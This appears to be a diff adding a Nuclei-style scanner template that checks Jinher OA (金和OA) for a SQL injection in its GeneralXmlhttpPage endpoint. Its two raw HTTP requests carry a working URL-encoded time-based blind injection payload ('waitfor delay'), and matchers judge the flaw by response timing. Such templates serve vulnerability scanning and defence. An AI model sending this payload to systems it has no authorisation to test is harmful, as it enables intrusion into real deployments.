@@ -1,0 +1,53 @@
+id: poc-yaml-jinher-generalxmlhttppage-sqli
+info:
+  name: 金和OA GeneralXmlhttpPage SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  reference:
+    - app="金和网络-金和OA"
+  metadata:
+    finger: 金和OA
+
+variables:
+  t1: "{{rand_int(5, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1, 4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/JHSoft.UI.Lib/"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A{{t3}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/JHSoft.UI.Lib/"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t3)"
+          - "duration < to_number(t4)"
